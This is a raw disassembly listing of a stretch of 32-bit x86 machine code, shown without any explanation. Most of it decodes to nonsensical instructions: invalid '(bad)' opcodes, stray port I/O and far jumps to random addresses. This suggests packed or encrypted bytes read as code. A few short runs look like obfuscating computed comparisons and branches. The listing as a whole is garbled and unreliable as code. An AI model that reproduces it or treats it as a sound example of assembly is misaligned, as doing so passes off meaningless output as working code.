  41cfe4:	mov    esi,DWORD PTR [edi+0x6b]
  41cfe7:	xchg   ebp,eax
  41cfe8:	push   ecx
  41cfe9:	test   BYTE PTR [edi],bl
  41cfeb:	adc    BYTE PTR [edx-0x568c1477],bh
  41cff1:	call   0xd877a822
  41cff6:	jmp    0x9d85dc9
  41cffb:	shl    eax,1
  41cffd:	shr    BYTE PTR [eax+0x1c],0xfa
  41d001:	in     al,0xce
  41d003:	jle    0x41d01b
  41d005:	adc    DWORD PTR [esi+0x57c6eba7],edi
  41d00b:	es sbb esi,esp
  41d00e:	and    edx,DWORD PTR [edi]
  41d010:	dec    ebp
  41d011:	push   ss
  41d012:	and    al,BYTE PTR [esi-0x2e339576]
  41d018:	pop    ss
  41d019:	and    DWORD PTR [edi],esi
  41d01b:	nop
  41d01c:	mov    ebx,0x5c772490
  41d021:	adc    eax,0x40ce84cb
  41d026:	xor    BYTE PTR [esi+0x57],cl
  41d029:	or     BYTE PTR [edi-0x232076e7],dl
  41d02f:	mov    al,ds:0xa6111b8d
  41d034:	lea    ecx,[ebx+0x407ec7d9]
  41d03a:	pop    eax
  41d03b:	popf   
  41d03c:	mov    BYTE PTR [edx],bl
  41d03e:	test   al,0x77
  41d040:	inc    ebp
  41d041:	ror    ebp,cl
  41d043:	dec    esi
  41d044:	and    BYTE PTR [esi],ah
  41d046:	dec    esp
  41d047:	jns    0x41d0a8
  41d049:	cmc    
  41d04a:	sub    BYTE PTR [eax+0x48],dh
  41d04d:	jmp    0x41d0c3
  41d04f:	mov    ch,0x9a
  41d051:	mov    cl,0x2c
  41d053:	cli    
  41d054:	popa   
  41d055:	sub    DWORD PTR [esp+edi*1],esi
  41d058:	dec    esp
  41d059:	push   ebp
  41d05a:	outs   dx,DWORD PTR ds:[esi]
  41d05b:	fs sub eax,0x3a6ebd61
  41d061:	(bad)  
  41d062:	nop    DWORD PTR [esi+0x23]
  41d066:	popf   
  41d067:	pop    edi
  41d068:	dec    edx
  41d069:	fild   DWORD PTR [edx-0x5]
  41d06c:	adc    BYTE PTR [eax-0x38],ch
  41d06f:	add    ah,BYTE PTR [esi+0x62]
  41d072:	ds or  al,0xf
  41d075:	pushf  
  41d076:	sahf   
  41d077:	add    cl,BYTE PTR [edi-0xef75866]
  41d07d:	icebp  
  41d07e:	xor    esi,esp
  41d080:	sbb    eax,0xc3f397d
  41d085:	icebp  
  41d086:	cld    
  41d087:	pop    ebx
  41d088:	xchg   edi,eax
  41d089:	enter  0x12df,0x16
  41d08d:	push   ebx
  41d08e:	test   bl,bl
  41d090:	pop    edx
  41d091:	dec    edx
  41d092:	jge    0x41d0a1
  41d094:	and    BYTE PTR ds:0x503de175,dl
  41d09a:	test   BYTE PTR [edi-0x23],bh
  41d09d:	mov    al,0x77
  41d09f:	or     eax,0x52df3ca9
  41d0a4:	repnz rol DWORD PTR [ecx],cl
  41d0a7:	fs add eax,0x3c099c42
  41d0ad:	xchg   ebp,eax
  41d0ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0af:	(bad)  
  41d0b0:	outs   dx,DWORD PTR ds:[esi]
  41d0b1:	push   ebx
  41d0b2:	dec    ebx
  41d0b3:	pop    ecx
  41d0b4:	push   esp
  41d0b5:	in     eax,0x22
  41d0b7:	mov    ?,WORD PTR [edi+0x29fc8cb5]
  41d0bd:	jmp    0x41d09b
  41d0bf:	popa   
  41d0c0:	lahf   
  41d0c1:	sbb    eax,0xbfa9fc41
  41d0c6:	aam    0x24
  41d0c8:	adc    DWORD PTR [eax+0x5d],ecx
  41d0cb:	push   edi
  41d0cc:	leave  
  41d0cd:	or     al,0x2a
  41d0cf:	ror    DWORD PTR [edx+0x2c38244c],0x56
  41d0d6:	movzx  eax,al
  41d0d9:	movzx  ecx,cl
  41d0dc:	cdq    
  41d0dd:	idiv   ecx
  41d0df:	movzx  ecx,BYTE PTR [esp+0x2c]
  41d0e4:	or     eax,ecx
  41d0e6:	mov    BYTE PTR [esp+0xc],al
  41d0ea:	mov    BYTE PTR [esp+0x24],0x1
  41d0ef:	mov    BYTE PTR [esp+0x2b],0xcf
  41d0f4:	mov    BYTE PTR [esp+0x3c],0x6
  41d0f9:	mov    BYTE PTR [esp+0x38],0x25
  41d0fe:	mov    BYTE PTR [esp+0x2c],0xf8
  41d103:	mov    al,BYTE PTR [esp+0x2c]
  41d107:	mov    cl,BYTE PTR [esp+0x38]
  41d10b:	or     al,0xc4
  41d10d:	and    al,cl
  41d10f:	mov    cl,BYTE PTR [esp+0x3c]
  41d113:	imul   cl
  41d115:	mov    cl,BYTE PTR [esp+0x2b]
  41d119:	movzx  ecx,cl
  41d11c:	movzx  eax,al
  41d11f:	and    eax,ecx
  41d121:	mov    cl,BYTE PTR [esp+0x24]
  41d125:	movzx  ecx,cl
  41d128:	cdq    
  41d129:	idiv   ecx
  41d12b:	mov    cl,BYTE PTR [esp+0xc]
  41d12f:	cmp    cl,al
  41d131:	je     0x41d926
  41d137:	lea    eax,[esp+0x9c]
  41d13e:	push   eax
  41d13f:	lea    edi,[esp+0x80]
  41d146:	call   0x40f356
  41d14b:	cmp    eax,ebx
  41d14d:	jmp    0x41d51c
  41d152:	lahf   
  41d153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d154:	out    dx,eax
  41d155:	cdq    
  41d156:	out    dx,eax
  41d157:	inc    ecx
  41d158:	push   ds
  41d159:	push   ds
  41d15a:	mov    eax,0xd3bc6585
  41d15f:	test   BYTE PTR [ecx-0x50],dh
  41d162:	ss pop ebp
  41d164:	push   ss
  41d165:	sbb    BYTE PTR [edx+edx*1-0x5326e7e8],bh
  41d16c:	outs   dx,DWORD PTR ds:[esi]
  41d16d:	das    
  41d16e:	sbb    al,0xe8
  41d170:	psubd  mm1,QWORD PTR [eax-0x42b231d9]
  41d177:	xlat   BYTE PTR ds:[ebx]
  41d178:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d179:	sbb    al,0x6a
  41d17b:	jecxz  0x41d12d
  41d17d:	adc    eax,0x87358dba
  41d182:	pop    es
  41d183:	(bad)  
  41d184:	(bad)  
  41d185:	int    0x7a
  41d187:	add    cl,BYTE PTR [esp+edx*1-0x59]
  41d18b:	lods   al,BYTE PTR ds:[esi]
  41d18c:	cs xchg ecx,eax
  41d18e:	rol    DWORD PTR [ecx+0x3d],cl
  41d191:	or     dh,BYTE PTR [ebp+0x7923cf10]
  41d197:	sbb    eax,0xaabb98ec
  41d19c:	pop    edx
  41d19d:	test   BYTE PTR [esi-0x647fee7d],0x33
  41d1a4:	jge    0x41d1d3
  41d1a6:	mov    bh,bh
  41d1a8:	push   edx
  41d1a9:	repz push ss
  41d1ab:	pop    ecx
  41d1ac:	xchg   ebx,eax
  41d1ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1ae:	mov    BYTE PTR [esi-0x1c731a36],cl
  41d1b4:	mov    edx,0x2ea5ef00
  41d1b9:	std    
  41d1ba:	outs   dx,DWORD PTR ds:[esi]
  41d1bb:	xchg   ecx,eax
  41d1bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1bd:	and    al,0x2e
  41d1bf:	pop    es
  41d1c0:	mov    al,0x29
  41d1c2:	xor    al,0xad
  41d1c4:	pop    edi
  41d1c5:	lods   al,BYTE PTR ds:[esi]
  41d1c6:	sub    al,0x72
  41d1c8:	loop   0x41d225
  41d1ca:	scas   eax,DWORD PTR es:[edi]
  41d1cb:	xchg   DWORD PTR [esi+edi*2],esp
  41d1ce:	mov    ebp,0x9bddbb9c
  41d1d3:	mov    eax,0x65757c1a
  41d1d8:	stos   DWORD PTR es:[edi],eax
  41d1d9:	cmp    cl,cl
  41d1db:	adc    eax,0xbf885c1e
  41d1e0:	loop   0x41d1f7
  41d1e2:	ror    cl,1
  41d1e4:	add    ecx,DWORD PTR [esi+0x3f]
  41d1e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d1e8:	mov    bh,0x71
  41d1ea:	sub    eax,DWORD PTR [ebx-0x59e2d6c4]
  41d1f0:	sub    ebx,ebx
  41d1f2:	loopne 0x41d1ee
  41d1f4:	popa   
  41d1f5:	dec    edx
  41d1f6:	(bad)  
  41d1f8:	jge    0x41d245
  41d1fa:	pop    edi
  41d1fb:	xchg   esi,eax
  41d1fc:	data16 scas al,BYTE PTR es:[edi]
  41d1fe:	sti    
  41d1ff:	es xor al,0xa6
  41d203:	inc    esp
  41d204:	mov    ebx,0x86b59635
  41d209:	cwd    
  41d20b:	cmp    eax,0x88e098e7
  41d210:	xor    eax,0x228b8668
  41d215:	pop    edi
  41d216:	std    
  41d217:	lods   al,BYTE PTR ds:[esi]
  41d218:	(bad)  
  41d219:	dec    ecx
  41d21a:	imul   edx,ecx,0x1986896
  41d220:	sub    eax,0x277f1ca8
  41d225:	pop    ecx
  41d226:	fdivr  st,st(2)
  41d228:	clc    
  41d229:	fs mov ah,dl
  41d22c:	and    al,0x69
  41d22e:	xchg   ecx,eax
  41d22f:	fldenv [ecx+eiz*2]
  41d232:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d233:	outs   dx,BYTE PTR ds:[esi]
  41d234:	push   cs
  41d235:	add    al,0x6b
  41d237:	sub    cl,bl
  41d239:	cmp    dl,bl
  41d23b:	test   eax,0xbad58dd1
  41d240:	add    dl,BYTE PTR [esi]
  41d242:	cmc    
  41d243:	push   ebp
  41d244:	dec    edi
  41d245:	push   0x4
  41d247:	inc    ebx
  41d248:	test   BYTE PTR [esi],dl
  41d24a:	pop    edx
  41d24b:	adc    DWORD PTR [eax-0x49326000],ecx
  41d251:	pop    ebp
  41d252:	pusha  
  41d253:	fiadd  WORD PTR [edx]
  41d255:	call   0x52d42e86
  41d25a:	jmp    0x3711:0x20c1bc5c
  41d261:	push   0x45ec8fe4
  41d266:	xor    edx,eax
  41d268:	cld    
  41d269:	das    
  41d26a:	pop    ds
  41d26b:	retf   0xf07d
  41d26e:	test   al,al
  41d270:	pusha  
  41d271:	pop    ds
  41d272:	fisub  WORD PTR [esi+0x3e5834c0]
  41d278:	inc    ebx
  41d279:	cmovg  esi,DWORD PTR [ebx+0x1e]
  41d27d:	pop    esp
  41d27e:	pop    es
  41d27f:	jle    0x41d288
  41d281:	mov    ds:0x17d884a4,al
  41d286:	or     eax,0xa2b620de
  41d28b:	loop   0x41d2d0
  41d28d:	sub    eax,esp
  41d28f:	ds push 0xffffffae
  41d292:	pushf  
  41d293:	add    eax,0x417baea8
  41d298:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d299:	shl    DWORD PTR [ebp-0x42],cl
  41d29c:	cs hlt 
  41d29e:	frstor [ecx+0x3464face]
  41d2a4:	xor    al,0x7d
  41d2a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2a7:	xchg   edx,eax
  41d2a8:	mov    al,0x32
  41d2aa:	stos   BYTE PTR es:[edi],al
  41d2ab:	out    0xf1,al
  41d2ad:	jmp    0xf321:0xc2bef652
  41d2b4:	(bad)  
  41d2b5:	std    
  41d2b6:	test   al,0xc1
  41d2b8:	pop    ecx
  41d2b9:	paddusb mm1,QWORD PTR [eax-0x32]
  41d2bd:	dec    ebx
  41d2be:	les    ecx,FWORD PTR [ebp+0x21a4b6b4]
  41d2c4:	mov    edx,0xf6d25018
  41d2c9:	adc    BYTE PTR [edi+0x55],bh
  41d2cc:	es stc 
  41d2ce:	fwait
  41d2cf:	ror    BYTE PTR [ecx-0x7056e0b5],1
  41d2d5:	ret    0xa3ab
  41d2d8:	jno    0x41d341
  41d2da:	mov    edi,0xf8d828f7
  41d2df:	scas   eax,DWORD PTR es:[edi]
  41d2e0:	stos   DWORD PTR es:[edi],eax
  41d2e1:	jle    0x41d280
  41d2e3:	sub    eax,0x2f8ddc37
  41d2e8:	add    BYTE PTR [ebp-0x2f],al
  41d2eb:	and    BYTE PTR [ebx],bl
  41d2ed:	fdiv   QWORD PTR [esp+ebp*4-0x4c]
  41d2f1:	cwde   
  41d2f2:	or     cl,al
  41d2f4:	rcl    DWORD PTR [eax+0x40],0x1a
  41d2f8:	and    edi,DWORD PTR [ebx+0x4a2eff5f]
  41d2fe:	fisubr WORD PTR [eax-0x229c79ad]
  41d304:	mov    edx,0xf7b76e90
  41d309:	jp     0x41d2d9
  41d30b:	lea    esi,ds:0xa839ce40
  41d311:	add    esp,DWORD PTR [esi+0x71]
  41d314:	and    eax,0x59f941b7
  41d319:	mov    ds:0x34cbb523,eax
  41d31e:	out    dx,al
  41d31f:	cdq    
  41d320:	pushf  
  41d321:	dec    ebp
  41d322:	lahf   
  41d323:	or     al,0x5f
  41d325:	retf   0xa6d4
  41d328:	out    dx,al
  41d329:	rcr    BYTE PTR [edx-0x1c],0x42
  41d32d:	dec    ebp
  41d32e:	sub    dh,BYTE PTR [edi]
  41d330:	or     edi,DWORD PTR [ebx-0xb]
  41d333:	loop   0x41d2db
  41d335:	dec    esi
  41d336:	in     al,dx
  41d337:	data16 or BYTE PTR [ebx],dl
  41d33a:	mov    edx,0x5df7550
  41d33f:	imul   ecx,DWORD PTR ds:0xd73108b4,0x41
  41d346:	lock mov ecx,0x865ffb4c
  41d34c:	xor    eax,edi
  41d34e:	xor    edi,DWORD PTR [edx-0x24a3fb39]
  41d354:	lock imul ecx,DWORD PTR [ebp+0x2875bc4e],0x2b9243ec
  41d35f:	xchg   esp,eax
  41d360:	pushf  
  41d361:	jmp    0x41d33f
  41d363:	xchg   edx,eax
  41d364:	iret   
  41d365:	mov    dl,0xb5
  41d367:	mov    al,0xa6
  41d369:	jno    0x41d301
  41d36b:	arpl   dx,di
  41d36d:	xchg   BYTE PTR [esi+ebp*4-0x7c3b0b80],ch
  41d374:	and    ebp,DWORD PTR [edi+0x4dbe81e9]
  41d37a:	jno    0x41d367
  41d37c:	sti    
  41d37d:	test   cl,0x15
  41d380:	push   0xfffffffd
  41d382:	bnd je 0x41d313
  41d385:	mov    edx,0xcc347e2d
  41d38a:	jmp    FWORD PTR [ebp-0x20]
  41d38d:	sub    al,0xdf
  41d38f:	cld    
  41d390:	test   eax,0xbb9669a8
  41d395:	pop    ss
  41d396:	xlat   BYTE PTR ds:[ebx]
  41d397:	push   cs
  41d398:	mov    esi,0xafcb049e
  41d39d:	push   es
  41d39e:	bnd jne 0x41d3a8
  41d3a1:	dec    esp
  41d3a2:	mov    esp,0x129df3ca
  41d3a7:	das    
  41d3a8:	out    0x30,al
  41d3aa:	add    eax,0x37f1c771
  41d3af:	(bad)  [edx+0x3]
  41d3b2:	sar    ebx,cl
  41d3b4:	dec    esp
  41d3b5:	push   edx
  41d3b6:	bound  eax,QWORD PTR [ecx+eax*4]
  41d3b9:	ret    
  41d3ba:	push   ebp
  41d3bb:	dec    esi
  41d3bc:	push   ds
  41d3bd:	dec    ecx
  41d3be:	aaa    
  41d3bf:	fisttp DWORD PTR [ecx]
  41d3c1:	sbb    bl,al
  41d3c3:	and    al,0x5f
  41d3c5:	or     eax,0x47bfdba
  41d3ca:	or     esi,DWORD PTR [esi-0x50]
  41d3cd:	sub    DWORD PTR [ecx+0x69b79ecb],ebx
  41d3d3:	adc    dh,BYTE PTR [edx]
  41d3d5:	call   0x3897:0x62c33e60
  41d3dc:	adc    ch,BYTE PTR [edx]
  41d3de:	jmp    0x6bf9e3e4
  41d3e3:	lea    ebp,[eax-0x42]
  41d3e6:	dec    esp
  41d3e7:	les    esi,FWORD PTR [ecx-0x6e4a526d]
  41d3ed:	repnz test eax,0x9a17d34
  41d3f3:	push   edi
  41d3f4:	test   BYTE PTR [edx],bl
  41d3f6:	xchg   DWORD PTR [ecx],eax
  41d3f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d3fa:	test   BYTE PTR [esi+0x235baab4],bl
  41d400:	pop    esi
  41d401:	add    DWORD PTR [ecx],edx
  41d403:	sbb    DWORD PTR ds:0xad612fe4,ebp
  41d409:	dec    eax
  41d40a:	push   edi
  41d40b:	dec    ebx
  41d40c:	add    BYTE PTR [edx+0x26],bh
  41d40f:	inc    edx
  41d410:	mov    al,0x14
  41d412:	ret    
  41d413:	sbb    DWORD PTR [edx],ecx
  41d415:	rol    cl,1
  41d417:	cdq    
  41d418:	fwait
  41d419:	ret    
  41d41a:	bound  esp,QWORD PTR [ecx-0x2d]
  41d41d:	add    al,0x95
  41d41f:	loope  0x41d3cf
  41d421:	push   eax
  41d422:	sti    
  41d423:	in     al,dx
  41d424:	scas   al,BYTE PTR es:[edi]
  41d425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d426:	popf   
  41d427:	int    0x25
  41d429:	popa   
  41d42a:	sbb    dl,BYTE PTR [eax+0x5dd1d139]
  41d430:	iret   
  41d431:	adc    al,0xde
  41d433:	push   cs
  41d434:	fild   WORD PTR [esi+0x71]
  41d437:	mov    ah,0x12
  41d439:	pop    esp
  41d43a:	ror    DWORD PTR [ebp+0x40964ec1],cl
  41d440:	bndstx [ecx],(bad)
  41d443:	mov    ecx,0x321db606
  41d448:	dec    ebp
  41d449:	into   
  41d44a:	bound  esp,QWORD PTR [ebp-0x5419aee]
  41d450:	jecxz  0x41d3fb
  41d452:	sbb    eax,esi
  41d454:	jecxz  0x41d450
  41d456:	jmp    0xd5cc:0x7d2f26c7
  41d45d:	mov    cl,0x65
  41d45f:	aaa    
  41d460:	xchg   edx,eax
  41d461:	push   ss
  41d462:	sub    eax,DWORD PTR [esi]
  41d464:	test   eax,0xa21ab7ac
  41d469:	mov    ah,0x4a
  41d46b:	stos   BYTE PTR es:[edi],al
  41d46c:	mov    ah,0x3b
  41d46e:	ds icebp 
  41d470:	jbe    0x41d492
  41d472:	or     esi,esi
  41d474:	fsub   st(5),st
  41d476:	pop    ecx
  41d477:	adc    edi,esp
  41d479:	lds    ebx,FWORD PTR [esi+0x7]
  41d47c:	jg     0x41d438
  41d47e:	push   ds
  41d47f:	dec    esp
  41d480:	aam    0xa7
  41d482:	dec    edi
  41d483:	pop    eax
  41d484:	dec    esp
  41d485:	add    esi,ebp
  41d487:	(bad)  
  41d488:	iret   
  41d489:	and    DWORD PTR [ebx],eax
  41d48b:	cdq    
  41d48c:	sahf   
  41d48d:	lea    esp,[eax+0x308ecfe0]
  41d493:	or     BYTE PTR [ebx],cl
  41d495:	push   ecx
  41d496:	dec    esp
  41d497:	or     cl,dl
  41d499:	(bad)  
  41d49a:	mov    al,0x3b
  41d49c:	sub    eax,0xedc363f4
  41d4a1:	mov    dh,0xc9
  41d4a3:	push   es
  41d4a4:	and    BYTE PTR [eax-0x3fe78c56],dh
  41d4aa:	add    al,0xb7
  41d4ac:	jo     0x41d4b6
  41d4ae:	sub    bl,BYTE PTR ds:0x46341bc8
  41d4b4:	xor    bh,0x3
  41d4b7:	inc    esp
  41d4b8:	inc    edi
  41d4b9:	(bad)  
  41d4ba:	push   esi
  41d4bb:	imul   DWORD PTR [ebx-0x4a1c4e8f]
  41d4c1:	xchg   ecx,eax
  41d4c2:	xor    DWORD PTR [ecx-0x6e],ebp
  41d4c5:	hlt    
  41d4c6:	test   DWORD PTR [esi+0x15f01c62],0xc7719ff9
  41d4d0:	out    0x8a,eax
  41d4d2:	inc    esp
  41d4d3:	stc    
  41d4d4:	xlat   BYTE PTR ds:[ebx]
  41d4d5:	mov    dl,0xbe
  41d4d7:	popf   
  41d4d8:	mov    dl,ch
  41d4da:	ins    BYTE PTR es:[edi],dx
  41d4db:	fnstsw WORD PTR [esi]
  41d4dd:	js     0x41d491
  41d4df:	inc    ebx
  41d4e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4e1:	adc    dl,al
  41d4e3:	repz inc ebx
  41d4e5:	jg     0x41d4ff
  41d4e7:	xor    dh,BYTE PTR [ebx+0x670e1f0e]
  41d4ed:	adc    al,0x4c
  41d4ef:	stos   DWORD PTR es:[edi],eax
  41d4f0:	in     eax,0x38
  41d4f2:	out    0xd2,al
  41d4f4:	repnz push ds
  41d4f6:	push   esp
  41d4f7:	retf   
  41d4f8:	cmp    BYTE PTR [eax+0x6c14c432],dh
  41d4fe:	xchg   ebx,eax
  41d4ff:	dec    esp
  41d500:	adc    ebx,ebx
  41d502:	xchg   ebp,eax
  41d503:	aam    0x8a
  41d505:	arpl   bx,sp
  41d507:	imul   esi,DWORD PTR [edx-0x74],0xe8b49e93
  41d50e:	cli    
  41d50f:	pop    eax
  41d510:	ja     0x41d4ba
  41d512:	sbb    eax,0x1e0069f2
  41d517:	rol    bl,0xa1
  41d51a:	pop    esp
  41d51b:	int3   
  41d51c:	jne    0x41d926
  41d522:	cmp    edx,esi
  41d524:	jne    0x41d926
  41d52a:	xor    eax,eax
  41d52c:	jmp    0x41e9f0
  41d531:	mov    eax,DWORD PTR [esp+0x70]
  41d535:	mov    ecx,DWORD PTR [esp+0x74]
  41d539:	jmp    0x41d908
  41d53e:	ss lahf 
  41d540:	xchg   ebp,eax
  41d541:	sbb    al,0x7c
  41d543:	sbb    bl,BYTE PTR [esi]
  41d545:	fwait
  41d546:	push   ebx
  41d547:	out    0xc5,eax
  41d549:	jl     0x41d4fa
  41d54b:	jecxz  0x41d4e0
  41d54d:	mov    esp,0x181655da
  41d552:	mov    esp,0x29181812
  41d557:	xor    al,0x4
  41d559:	fistp  WORD PTR [esi-0x5e]
  41d55c:	stc    
  41d55d:	cli    
  41d55e:	bound  esp,QWORD PTR [ecx]
  41d560:	out    0xb0,al
  41d562:	outs   dx,BYTE PTR ds:[esi]
  41d563:	(bad)  
  41d564:	xchg   ebp,eax
  41d565:	out    0xa7,eax
  41d567:	test   eax,0x6e06cdbd
  41d56c:	or     dl,BYTE PTR [edi+0x38]
  41d56f:	getsec 
  41d571:	xor    DWORD PTR [ebx-0x33740b9a],0x5c
  41d578:	adc    DWORD PTR [edx-0x14],edx
  41d57b:	xor    eax,0x4c73855c
  41d580:	fs enter 0x138e,0xc4
  41d585:	pmullw mm2,QWORD PTR [edx+0x56a46446]
  41d58c:	loop   0x41d518
  41d58e:	cs mov bl,0x5
  41d591:	test   cl,ah
  41d593:	adc    eax,0x8396a77e
  41d599:	xchg   edx,eax
  41d59a:	jg     0x41d5db
  41d59c:	or     edx,ebp
  41d59e:	cdq    
  41d59f:	hlt    
  41d5a0:	adc    dh,BYTE PTR [edx-0x5c4f0813]
  41d5a6:	sbb    eax,0x40df5375
  41d5ab:	inc    esp
  41d5ac:	mov    DWORD PTR [ebx+0x50],ebx
  41d5af:	mov    cl,0x70
  41d5b1:	cli    
  41d5b2:	push   edx
  41d5b3:	mov    ebp,0xc84982aa
  41d5b8:	and    al,0xe4
  41d5ba:	cmp    eax,0xdbbf4b62
  41d5bf:	cmp    edx,ebx
  41d5c1:	bound  eax,QWORD PTR [ecx]
  41d5c3:	push   cs
  41d5c4:	rcr    BYTE PTR [edi+0x1d],cl
  41d5c7:	add    DWORD PTR gs:[esi+0x62],0x1f
  41d5cc:	pop    esi
  41d5cd:	gs cmc 
  41d5cf:	add    DWORD PTR [esi+edi*4],edi
  41d5d2:	int    0x9
  41d5d4:	adc    al,0xbb
  41d5d6:	jmp    0x41d5cf
  41d5d8:	and    DWORD PTR [ecx+esi*4+0x2],esp
  41d5dc:	dec    ebp
  41d5dd:	cmp    eax,0x5132af97
  41d5e2:	add    DWORD PTR [esp+ecx*1+0x4],eax
  41d5e6:	mov    al,ds:0x572ad21
  41d5eb:	dec    ebx
  41d5ec:	fsubr  DWORD PTR [ecx]
  41d5ee:	cmp    BYTE PTR [ebp+0x513f0da4],ah
  41d5f4:	cmp    BYTE PTR [esi-0x7d],ah
  41d5f7:	mov    edx,0xe8c9b86f
  41d5fc:	xor    edx,edx
  41d5fe:	(bad)  
  41d600:	aas    
  41d601:	test   eax,0x96ff94a1
  41d606:	ficom  DWORD PTR [ecx]
  41d608:	es push edx
  41d60a:	dec    edx
  41d60b:	cmp    edi,ecx
  41d60d:	add    edx,DWORD PTR [ecx-0x21bcebf0]
  41d613:	out    0xd1,al
  41d615:	adc    DWORD PTR [edi+0x56],edx
  41d618:	(bad)  
  41d619:	jg     0x41d68d
  41d61b:	mov    ah,0xf2
  41d61d:	mov    BYTE PTR [ebx-0x40688516],0x56
  41d624:	pop    esp
  41d625:	icebp  
  41d626:	fidiv  DWORD PTR [esi]
  41d628:	or     al,0x6
  41d62a:	and    eax,0xea3597c4
  41d62f:	(bad)  
  41d630:	fnstenv [edi]
  41d632:	inc    esi
  41d633:	add    DWORD PTR [edx],esi
  41d635:	jl     0x41d682
  41d637:	nop
  41d638:	cdq    
  41d639:	mov    edi,DWORD PTR [eax+0x46]
  41d63c:	or     cl,bl
  41d63e:	arpl   WORD PTR [edx+0x6a],dx
  41d641:	outs   dx,DWORD PTR ds:[esi]
  41d642:	mov    gs,WORD PTR [esi-0x5c603f46]
  41d648:	mov    dl,0x48
  41d64a:	push   eax
  41d64b:	iret   
  41d64c:	pop    es
  41d64d:	inc    ecx
  41d64e:	inc    esi
  41d64f:	pop    es
  41d650:	loope  0x41d629
  41d652:	mov    ch,0x15
  41d654:	(bad)  
  41d655:	push   ebx
  41d656:	push   esp
  41d657:	andps  xmm1,xmm4
  41d65a:	js     0x41d605
  41d65c:	neg    DWORD PTR [ebp-0x550ab0ce]
  41d662:	loope  0x41d5e7
  41d664:	inc    ebp
  41d665:	(bad)  [ecx+ebx*1+0x10]
  41d66a:	xchg   edi,eax
  41d66b:	rol    ch,0xad
  41d66e:	adc    ah,BYTE PTR [edx-0x69321571]
  41d674:	ja     0x41d649
  41d676:	fst    DWORD PTR [ebp+0x5f398fe8]
  41d67c:	test   BYTE PTR [eax],dh
  41d67e:	sub    eax,DWORD PTR [eax]
  41d680:	std    
  41d681:	(bad)  
  41d682:	mov    ah,cl
  41d684:	mov    ecx,0xbeb7a7d0
  41d689:	repnz out 0x33,eax
  41d68c:	push   es
  41d68d:	sub    BYTE PTR [ecx],0x1b
  41d690:	sub    esp,edx
  41d692:	ret    0x1032
  41d695:	push   esi
  41d696:	jge    0x41d6e6
  41d698:	test   BYTE PTR [edx+0x5673da7d],ah
  41d69e:	aaa    
  41d69f:	dec    ebx
  41d6a0:	aad    0x48
  41d6a2:	popa   
  41d6a3:	rol    edi,cl
  41d6a5:	or     eax,0x159e9fa8
  41d6aa:	mov    eax,0x79dbbcca
  41d6af:	data16 (bad) 
  41d6b1:	cs sbb eax,0xe9b92e5d
  41d6b7:	xor    bh,BYTE PTR [esi-0x2e40138b]
  41d6bd:	ret    
  41d6be:	call   0x864bf3b
  41d6c3:	push   ds
  41d6c4:	fidiv  WORD PTR [ebp+0x7c9f1847]
  41d6ca:	in     eax,0x1f
  41d6cc:	inc    edi
  41d6cd:	(bad)  
  41d6ce:	jns    0x41d653
  41d6d0:	fcmovnu st,st(6)
  41d6d2:	mov    ds:0x28df1483,al
  41d6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6d8:	pop    esi
  41d6d9:	lods   eax,DWORD PTR ds:[esi]
  41d6da:	aas    
  41d6db:	inc    eax
  41d6dc:	dec    edx
  41d6dd:	mov    fs,WORD PTR [ecx+0x16]
  41d6e0:	mov    esi,0xe7e95d00
  41d6e5:	je     0x41d68b
  41d6e7:	mov    eax,ds:0xcb05045d
  41d6ec:	popa   
  41d6ed:	stos   BYTE PTR es:[edi],al
  41d6ee:	imul   ecx,DWORD PTR ds:0x4f6d1364,0x56
  41d6f5:	xchg   ebp,eax
  41d6f6:	repz out dx,al
  41d6f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6f9:	fimul  WORD PTR [esi]
  41d6fb:	jno    0x41d682
  41d6fd:	ins    DWORD PTR es:[edi],dx
  41d6fe:	sbb    edi,DWORD PTR [esp+edx*2-0x6e]
  41d702:	in     eax,0xdc
  41d704:	pop    ss
  41d705:	push   ebp
  41d706:	repnz push 0xffffff85
  41d709:	mov    edx,0x34ade615
  41d70e:	sub    DWORD PTR [eax],0x3f8657e3
  41d714:	(bad)
  41d718:	or     al,0x4f
  41d71a:	and    ecx,DWORD PTR [ebx+0x7a]
  41d71d:	shl    DWORD PTR [eax],cl
  41d71f:	jl     0x41d78c
  41d721:	mov    eax,ds:0x16873d0d
  41d726:	in     al,dx
  41d727:	test   al,0x17
  41d729:	sar    DWORD PTR ds:0x543f6c3a,0xaf
  41d730:	inc    ecx
  41d731:	popf   
  41d732:	adc    bl,ch
  41d734:	dec    edx
  41d735:	test   BYTE PTR [edx-0x5b73e194],ch
  41d73b:	rol    DWORD PTR [edi],1
  41d73d:	repz pop es
  41d73f:	jg     0x41d750
  41d741:	scas   eax,DWORD PTR es:[edi]
  41d742:	and    BYTE PTR [ebp-0x5a46e04f],0x8f
  41d749:	xchg   edx,eax
  41d74a:	jbe    0x41d7ad
  41d74c:	(bad)  [ebp+esi*2+0x7c]
  41d750:	jg     0x41d76f
  41d752:	mov    eax,0xcf37b9af
  41d757:	dec    edi
  41d758:	xor    esp,DWORD PTR [esi]
  41d75a:	ins    BYTE PTR es:[edi],dx
  41d75b:	sbb    BYTE PTR [ebp+eax*4-0x1f466959],bh
  41d762:	jmp    0x41d736
  41d764:	(bad)  
  41d765:	mov    ebp,0x92f7967
  41d76a:	inc    ebp
  41d76b:	das    
  41d76c:	jg     0x41d7b2
  41d76e:	das    
  41d76f:	mov    edi,0x2ea9c52
  41d774:	jae    0x41d79f
  41d776:	xchg   edi,eax
  41d777:	and    BYTE PTR [esi-0x45],0xcc
  41d77b:	bound  eax,QWORD PTR [esi+0x1ca70770]
  41d781:	sub    al,0x7a
  41d783:	add    ebp,DWORD PTR [esi]
